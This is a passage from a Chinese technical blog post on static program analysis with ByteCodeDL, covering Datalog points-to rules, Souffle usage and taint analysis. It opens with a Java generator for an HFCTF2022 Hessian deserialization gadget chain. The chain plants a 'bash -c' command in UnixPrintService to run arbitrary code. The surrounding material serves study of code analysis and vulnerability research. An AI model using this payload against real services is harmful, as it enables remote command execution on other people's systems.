class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HFCTF2022&quot;</span>.hashCode());</span><br><span class="line">        s = <span class="string">&quot;:Y1\&quot;nOJF-6A&#x27;&gt;|r-&quot;</span>;</span><br><span class="line">        System.out.println(s.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(outputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NoWriteReplaceSerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.setSerializerFactory(sf);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">unix</span> <span class="operator">=</span> unsafe.allocateInstance(UnixPrintService.class);</span><br><span class="line">        setFieldValue(unix, <span class="string">&quot;printer&quot;</span>, String.format(<span class="string">&quot;;bash -c &#x27;%s&#x27;;&quot;</span>, cmd));</span><br><span class="line">        setFieldValue(unix, <span class="string">&quot;lpcStatusCom&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;ls&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Class.forName(<span class="string">&quot;sun.print.UnixPrintService&quot;</span>), unix);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">hashCodeTrigger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        out.writeMapBegin(<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">        out.writeObject(hashCodeTrigger);</span><br><span class="line">        out.writeObject(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        out.writeMapEnd();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">fld</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">            fld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            fld.set(obj, value);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">NoWriteReplaceSerializerFactory</span> <span class="keyword">extends</span> <span class="title class_">SerializerFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Serializer <span class="title function_">getObjectSerializer</span> <span class="params">(Class&lt;?&gt; cl )</span> <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.getObjectSerializer(cl);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Serializer <span class="title function_">getSerializer</span> <span class="params">( Class cl )</span> <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">            <span class="type">Serializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="built_in">super</span>.getSerializer(cl);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( serializer <span class="keyword">instanceof</span> WriteReplaceSerializer) &#123;</span><br><span class="line">                <span class="keyword">return</span> UnsafeSerializer.create(cl);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> serializer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="4-上下文无关指针分析"><a href="#4-上下文无关指针分析" class="headerlink" title="4. 上下文无关指针分析"></a>4. 上下文无关指针分析</h4><blockquote>
+<p>由于Java多态的特性，不能仅根据<strong>声明类型</strong>解析函数调用，需要根据变量<strong>实际运行时</strong>的类型解析，通过指针分析可以得到变量在运行时指向的对象，进而可以得到对象的类型，然后根据类型即可解析出正确的被调函数，从而得到相对<strong>准确的函数调用图</strong></p>
+</blockquote>
+<ul>
+<li><p>理论部分</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403224743686.png" alt="image-20230403224743686" style="zoom:50%;"></p>
+<p>前置知识链接：</p>
+<p>[1] <a target="_blank" rel="noopener" href="https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-03-pointer3-analysis-spa#rule-for-call">https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-03-pointer3-analysis-spa#rule-for-call</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://souffle-lang.github.io/components">https://souffle-lang.github.io/components</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/blob/pt-noctx/docs/context-insensitive-points-to.md">https://github.com/BytecodeDL/ByteCodeDL/blob/pt-noctx/docs/context-insensitive-points-to.md</a></p>
+<p>算法 datalog 源码分析：</p>
+<p>首先建立 EDB 和 IDB</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403231910409.png" alt="image-20230403231910409" style="zoom:50%;"></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403232116193.png" alt="image-20230403232116193" style="zoom:50%;"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 表示 var 变量指向 heap 这个堆对象  </span><br><span class="line">.decl VarPointsTo(heap:Heap, var:Var)</span><br><span class="line">// 表示 baseHeap 这个对象的 field 字段 指向 heap 对象</span><br><span class="line">  .decl InstanceFieldPointsTo(heap:Heap, baseHeap:Heap, field:Field)</span><br><span class="line">// 表示静态 field 指向 heap 这个对象</span><br><span class="line">  .decl StaticFieldPointsTo(heap:Heap, field:Field)</span><br><span class="line">// 表示在 baseHeap 数组中，包含了 heap 对象</span><br><span class="line">  .decl ArrayIndexPointsTo(heap:Heap, baseHeap:Heap)</span><br><span class="line">// 表示在 insn 指令中, caller 调用了 callee</span><br><span class="line">  .decl CallGraph(insn:Insn, caller:Method, callee:Method)</span><br><span class="line">// 表示方法可以访问到</span><br><span class="line">  .decl Reachable(method:Method)</span><br></pre></td></tr></table></figure>
+<p>根据图示可以找到 datalog 和指针分析规则对应的写法</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403232627931.png" alt="image-20230403232627931" style="zoom:50%;"></p>
+<ol>
+<li><p>处理 new 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// new</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且在method中，将创建好的 heap 对象赋值给了 var 变量</span><br><span class="line">// 那么能够推导出 var 变量指向 heap 对象</span><br><span class="line">VarPointsTo(heap, var) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        AssignHeapAllocation(_, _, heap, var, method, _).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理 Assign 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// assign</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且 form 变量 指向 heap 对象</span><br><span class="line">// 且 在method中，将 from 变量赋值给了 to 即 to=form</span><br><span class="line">// 那么能够推到出 to变量也指向 heap 对象</span><br><span class="line">    VarPointsTo(heap, to) :- </span><br><span class="line">        Reachable(method),</span><br><span class="line">        VarPointsTo(heap, from),</span><br><span class="line">        AssignLocal(_, _, from, to, method).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理 store 语句</p>
+<p>这里分成静态和实例对象的 store 情况</p>
+<p>实例对象 field 的 store 操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// store field</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且在 method 中，将 from 存到了变量 base 的field，也就是 base.field = from</span><br><span class="line">// 且 from 指向 heap 对象</span><br><span class="line">// 且 base 指向 baseHeap 对象</span><br><span class="line">// 那么能够推到出 baseHeap 对象的 field 也指向 heap 对象</span><br><span class="line">InstanceFieldPointsTo(heap, baseHeap, field) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        StoreInstanceField(_, _, from, base, field, method),</span><br><span class="line">        VarPointsTo(heap, from),</span><br><span class="line">        VarPointsTo(baseHeap, base).</span><br></pre></td></tr></table></figure>
+<p>静态 field 的 store 操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// store static field</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且在 method中，将 from 存入静态 field 即 T.field = from</span><br><span class="line">// 且 from 指向 heap 对象</span><br><span class="line">// 那么可以推到出 静态 field 指向 heap 对象</span><br><span class="line">StaticFieldPointsTo(heap, field) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        StoreStaticField(_, _, from, field, method),</span><br><span class="line">        VarPointsTo(heap, from).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理 load 语句</p>
+<p>同样分成静态和实例对象的 load 情况：</p>
+<p>实例对象 field 的 load 操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// load field</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且 在 method 中，将 base 变量的 field 取出赋值给了 to 也就是 to = base.field</span><br><span class="line">// 且 base 指向 baseHeap 对象</span><br><span class="line">// 且 baseHeap 对象的 field 指向 heap 对象</span><br><span class="line">// 那么能够推到出 to 也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, to) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        LoadInstanceField(_, _, to, base, field, method),</span><br><span class="line">        VarPointsTo(baseHeap, base),</span><br><span class="line">        InstanceFieldPointsTo(heap, baseHeap, field).</span><br></pre></td></tr></table></figure>
+<p>静态 field 的 load 操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// load staic field</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且在 method 中，将静态 field 取出赋值给了 to 即 to = T.field</span><br><span class="line">// 且 field 指向 heap 对象</span><br><span class="line">// 那么可以推导出 to 也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, to) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        LoadStaticField(_, _, to, field, method),</span><br><span class="line">        StaticFieldPointsTo(heap, field).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>类型转换</p>
+<p>本质上和赋值操作的指针分析操作一致</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// cast</span><br><span class="line">// 如果 method 方法可访问</span><br><span class="line">// 且 form 变量 指向 heap 对象</span><br><span class="line">// 且 在 method 中，将 from 变量类型转换后赋值给了 to 即 to = (T)from</span><br><span class="line">// 那么能够推到出 to 变量也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, to) :- </span><br><span class="line">        Reachable(method),</span><br><span class="line">        AssignCast(_, _, from, to, _, method),</span><br><span class="line">        VarPointsTo(heap, from).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组的 load 和 store</p>
+<p>由于分析选择的是数组下标不敏感，所以所有元素都视为 arr field 来看待</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// load from array</span><br><span class="line">// 如果 method 可访问</span><br><span class="line">// 且 从 base 数组中取出元素到 to to = base[i]</span><br><span class="line">// 且 base 指向 baseHeap 数组对象</span><br><span class="line">// 且 baseHeap 数组对象中 包含 heap 对象</span><br><span class="line">// 那么 to 可能指向 heap </span><br><span class="line">// 这里的实现未区分取第几个索引</span><br><span class="line">VarPointsTo(heap, to) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        LoadArrayIndex(_, _, to, base, method),</span><br><span class="line">        VarPointsTo(baseHeap, base),</span><br><span class="line">        ArrayIndexPointsTo(heap, baseHeap).</span><br><span class="line"></span><br><span class="line">// store into array</span><br><span class="line">// 如果 method 可访问</span><br><span class="line">// 将 from 存到 base 数组中 即 base[i] = from</span><br><span class="line">// from 指向 heap 对象 </span><br><span class="line">// base 指向 baseHeap 数组对象</span><br><span class="line">// 那么能推导出 baseHeap 数组对象 包含 heap 对象</span><br><span class="line">ArrayIndexPointsTo(heap, baseHeap) :-</span><br><span class="line">        Reachable(method),</span><br><span class="line">        StoreArrayIndex(_, _, from, base, method),</span><br><span class="line">        VarPointsTo(heap, from),</span><br><span class="line">        VarPointsTo(baseHeap, base).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理函数调用 call 部分</p>
+<p>首先对于 special 和 static 类的函数调用，由于 receiver type 已知，因此和 CHA 算法处理一致</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 下面开始涉及到过程间的指针分析</span><br><span class="line">// 先构造调用图</span><br><span class="line">// Special 和 Static 和 CHA 处理方式一样，编译时callee 就确定，不需要再进行解析</span><br><span class="line">Reachable(callee),</span><br><span class="line">CallGraph(insn, caller, callee) :- </span><br><span class="line">        Reachable(caller),</span><br><span class="line">        SpecialMethodInvocation(insn, _, callee, _, caller).</span><br><span class="line">    </span><br><span class="line">Reachable(callee),</span><br><span class="line">CallGraph(insn, caller, callee) :- </span><br><span class="line">        Reachable(caller),</span><br><span class="line">        StaticMethodInvocation(insn, _, callee, caller).</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<pre><code> &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230403235833247.png&quot; alt=&quot;image-20230403235833247&quot; style=&quot;zoom:50%;&quot; /&gt;
+
+ 对于 virtual 方法调用
+
+ &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404001509332.png&quot; alt=&quot;image-20230404001509332&quot; style=&quot;zoom:50%;&quot; /&gt;
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Virtual Call 需要根据 base 指向 对象 的类型 进行 dispatch</span><br><span class="line">// caller 要可达</span><br><span class="line">// 在caller 中 virtual call 了 method</span><br><span class="line">// 调用时 base 指向 baseHeap 对象</span><br><span class="line">// baseHeap 对象的类型 为 class</span><br><span class="line">// 根据method 解析出 被调函数的签名</span><br><span class="line">// 通过 函数签名 和 实际类型 解析出真正的被调函数callee</span><br><span class="line">Reachable(callee),</span><br><span class="line">CallGraph(insn, caller, callee) :- </span><br><span class="line">        Reachable(caller),</span><br><span class="line">        VirtualMethodInvocation(insn, _, method, base, caller),</span><br><span class="line">        VarPointsTo(baseHeap, base),</span><br><span class="line">        NormalHeap(baseHeap, class),</span><br><span class="line">        MethodInfo(method, simplename, _, _, _, descriptor, _),</span><br><span class="line">        Dispatch(simplename, descriptor, class, callee).</span><br></pre></td></tr></table></figure>
+
+ 接下来传递参数 形参 =&gt; 实参
+
+ &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404001732250.png&quot; alt=&quot;image-20230404001732250&quot; style=&quot;zoom:50%;&quot; /&gt;
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// param</span><br><span class="line">// 调用图中存在调用 insn</span><br><span class="line">// 调用时第 n 个实际参数传的是 变量 arg</span><br><span class="line">// 被调函数 callee 的 第 n 个 形式参数是 param</span><br><span class="line">// 如果 arg 指向了 heap 对象</span><br><span class="line">// 那么 param 也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, param) :- </span><br><span class="line">        CallGraph(insn, _, callee),</span><br><span class="line">        ActualParam(n, insn, arg),</span><br><span class="line">        FormalParam(n, callee, param),</span><br><span class="line">        VarPointsTo(heap, arg).</span><br></pre></td></tr></table></figure>
+
+ 然后是返回值的传递
+
+ &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404143728718.png&quot; alt=&quot;image-20230404143728718&quot; style=&quot;zoom:50%;&quot; /&gt;
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// return</span><br><span class="line">// 调用图中存在调用 insn</span><br><span class="line">// 如果 在callee中，返回语句返回的是var变量</span><br><span class="line">// 调用后的返回值赋值给了return变量</span><br><span class="line">// var 变量 指向 heap 对象</span><br><span class="line">// 那么 return 也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, return) :- </span><br><span class="line">        CallGraph(insn, _, callee),</span><br><span class="line">        Return(_, _, var, callee),</span><br><span class="line">        AssignReturnValue(insn, return),</span><br><span class="line">        VarPointsTo(heap, var).</span><br></pre></td></tr></table></figure>
+
+ 最后不要忘了 this 变量对象的传递
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// this</span><br><span class="line">// 调用图中存在调用 insn</span><br><span class="line">// 调用时 base 指向 heap</span><br><span class="line">// 那么调用时 callee 的 this 变量 也指向 heap 对象</span><br><span class="line">VarPointsTo(heap, this) :- </span><br><span class="line">        CallGraph(insn, _, callee),</span><br><span class="line">        (</span><br><span class="line">            VirtualMethodInvocation(insn, _, _, base, _);</span><br><span class="line">            SpecialMethodInvocation(insn, _, _, base, _)</span><br><span class="line">        ),</span><br><span class="line">        ThisVar(callee, this),</span><br><span class="line">        VarPointsTo(heap, base).</span><br></pre></td></tr></table></figure>
+</code></pre><p>  为了避免命名冲突，这里用 <code>.comp &#123;&#125;</code> 将上述定义的规则谓词封装成元素</p>
+<ul>
+<li><p>应用</p>
+<ol>
+<li><p>提取 facts </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-fact-generator.jar -i Benchmark-<span class="number">1.0</span>-SNAPSHOT.jar --full -l /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_91</span>.jdk/Contents/Home/jre/lib/rt.jar -d ../example/pt_free_test --allow-phantom --generate-jimple --facts-subset APP</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编写测试程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;logic/inputDeclaration.dl&quot;</span><br><span class="line">#include &quot;logic/utils.dl&quot;</span><br><span class="line">#include &quot;logic/pt-noctx.dl&quot;</span><br><span class="line"></span><br><span class="line">// 实例化 component</span><br><span class="line">.init cipt = ContextInsensitivePt</span><br><span class="line"></span><br><span class="line">// 初始化调用图入口</span><br><span class="line">cipt.Reachable(method) :- </span><br><span class="line">	MethodInfo(method, simplename, _, _, _, descriptor, _), </span><br><span class="line">	simplename = &quot;main&quot;, </span><br><span class="line">	descriptor = &quot;([Ljava/lang/String;)V&quot;.</span><br><span class="line"></span><br><span class="line">.output cipt.VarPointsTo</span><br></pre></td></tr></table></figure>
+<p>这里就是设置一下方法入口点为所有 main 函数</p>
+</li>
+<li><p>souffle 并输出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F pt_free_test/ -D . pt_con_free.dl</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230404152517388.png" alt="image-20230404152517388"></p>
+<p>从结果中可以看到指针分析的指向结果（<strong>格式：<heap, var></heap,></strong>），例如 <code>VirtualCallDemo1</code> 类 main 函数中，在 0行 首先有个初始化 <code>VirtualCallDemo2</code> 的操作，并将堆对象赋给了 vall2 参数（这里还标记了第6行）；</p>
+<p>其次第 9 行的 source 变量指向了 source 字面量</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230404152657094.png" alt="image-20230404152657094" style="zoom:50%;"></p>
+</li>
+<li><p>扩展</p>
+<blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/souffle-lang/java-pts">https://github.com/souffle-lang/java-pts</a></li>
+<li><a target="_blank" rel="noopener" href="https://bitbucket.org/yanniss/doop/src">doop</a> </li>
+</ul>
+</blockquote>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="5-pta-ptaint-Analysis"><a href="#5-pta-ptaint-Analysis" class="headerlink" title="5. pta/ptaint Analysis"></a>5. pta/ptaint Analysis</h4><ul>
+<li><p>前置知识</p>
+<blockquote>
+<p>[1] <a href="https://racerz-fighting.github.io/2023/02/04/PTaint%20Unified%20Points-to%20and%20Taint%20Analysis%20%E7%B2%BE%E8%AF%BB/">https://racerz-fighting.github.io/2023/02/04/PTaint%20Unified%20Points-to%20and%20Taint%20Analysis%20%E7%B2%BE%E8%AF%BB/</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://ranger-nju.gitbook.io/static-program-analysis-book/ch4/04-01-security">南大-污点分析部分</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=IA08d-kiCy8">https://www.youtube.com/watch?v=IA08d-kiCy8</a></p>
+</blockquote>
+<p>p/taint 论文的思想在于将指针分析和污点分析相统一，这里的统一并不是将污点数据在传统的抽象对象上打标记，而是作为独立的对象放入到抽象对象集中根据污点分析算法在 PFG 上传播</p>
+</li>
+<li><p>理论部分</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165306234.png" alt="image-20230405165306234" style="zoom:50%;"></p>
+</li>
+</ul>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165319030.png" alt="image-20230405165319030" style="zoom:50%;"></p>
